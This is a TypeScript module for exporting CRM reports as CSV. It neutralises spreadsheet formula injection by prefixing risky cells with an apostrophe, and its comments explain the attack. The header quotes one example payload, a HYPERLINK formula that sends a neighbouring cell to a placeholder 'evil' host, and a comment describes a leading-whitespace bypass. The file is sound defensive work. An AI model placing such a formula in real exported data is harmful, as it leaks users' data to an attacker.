/**
 * Getting the answer out of the product.
 *
 * Phase 5, ticket 13, fourth criterion: "results export in a portable format".
 * CSV, because portable means openable by the person who asked, and the person
 * who asked has a spreadsheet.
 *
 * Which is also the problem. A CSV is not an inert data format — it is a
 * program, if the spreadsheet decides it is. A cell beginning `=`, `+`, `-` or
 * `@` is a formula in Excel, Numbers and Google Sheets alike, and a CRM is
 * exactly the product where an attacker gets to choose cell contents: they fill
 * in a web form, or send an email whose subject lands on a timeline, and wait
 * for somebody to export a report and open it.
 *
 * `=HYPERLINK("https://evil/"&A1,"Click")` in a company name exfiltrates the
 * neighbouring cell to whoever put it there, and it is not an exotic attack —
 * it is the one that actually happens, because an export is trusted by the
 * person opening it in a way a web page is not.
 *
 * Quoting does not help: `"=1+1"` is still a formula, because the quotes are CSV
 * syntax that the parser removes before the spreadsheet sees the value. The only
 * reliable answer is to make the cell not start with a trigger character, which
 * is what `neutralise` does.
 */

/** The characters a spreadsheet reads as "this cell is code". */
const FORMULA_TRIGGERS = ["=", "+", "-", "@"] as const;

/**
 * Leading whitespace, stripped before the formula check rather than after.
 *
 * This is the bypass that defeats the naive version of this defence. Several CSV
 * readers trim a cell's leading whitespace, so a value beginning with a tab and
 * then `=1+1` arrives at the spreadsheet as `=1+1` — having passed a check that
 * looked at the first character and found a tab.
 */
const LEADING_WHITESPACE = /^[\t\r\n\f\v ]+/;

/**
 * One cell, made safe to open.
 *
 * The apostrophe prefix is the conventional fix and is not visible in the
 * spreadsheet — but it IS visible to a program reading the CSV, so it is applied
 * only where it is needed rather than to every cell. A phone number written
 * `+44 20 7946 0958` keeps its plus sign at the cost of a leading apostrophe;
 * that is the right trade, because the alternatives are a formula or a mangled
 * number.
 */
export function neutralise(value: string): string {
  const stripped = value.replace(LEADING_WHITESPACE, "");
  const first = stripped.charAt(0);
  return FORMULA_TRIGGERS.includes(first as (typeof FORMULA_TRIGGERS)[number])
    ? `'${stripped}`
    : stripped;
}

/** RFC 4180 quoting, applied after neutralisation, never instead of it. */
function quote(value: string): string {
  return /[",\r\n]/.test(value) ? `"${value.replace(/"/g, '""')}"` : value;
}

/**
 * How a value from the database becomes a cell.
 *
 * Dates as ISO 8601 rather than a locale format, because a report exported in
 * one country and opened in another must not silently reinterpret 03/04 as
 * April. Null as an empty cell rather than the string "null", which people
 * otherwise end up filtering out by hand.
 */
function cell(value: unknown): string {
  if (value === null || value === undefined) return "";
  if (value instanceof Date) return value.toISOString();
  if (typeof value === "boolean") return value ? "true" : "false";
  return quote(neutralise(String(value)));
}

export interface ExportedReport {
  readonly filename: string;
  readonly contentType: string;
  readonly body: string;
}

/**
 * The rows, as a file.
 *
 * Column order is taken from an explicit list rather than from the first row's
 * keys, because a report whose first row happens to omit a null column would
 * otherwise export a different shape than the same report run an hour later —
 * and a scheduled export that changes its columns between runs breaks whatever
 * is reading it downstream.
 */
export function toCsv(
  columns: readonly string[],
  rows: ReadonlyArray<Readonly<Record<string, unknown>>>,
): string {
  const lines = [columns.map((c) => quote(neutralise(c))).join(",")];
  for (const row of rows) lines.push(columns.map((column) => cell(row[column])).join(","));
  // CRLF: RFC 4180 says so, and Excel on Windows is the reader that cares.
  return lines.join("\r\n");
}

/** A filename a person can find again, without characters a filesystem refuses. */
export function exportReport(
  name: string,
  columns: readonly string[],
  rows: ReadonlyArray<Readonly<Record<string, unknown>>>,
  runAt: Date,
): ExportedReport {
  const slug =
    name
      .toLowerCase()
      .replace(/[^a-z0-9]+/g, "-")
      .replace(/^-+|-+$/g, "")
      .slice(0, 60) || "report";
  const stamp = runAt.toISOString().slice(0, 10);
  return {
    filename: `${slug}-${stamp}.csv`,
    contentType: "text/csv; charset=utf-8",
    body: toCsv(columns, rows),
  };
}
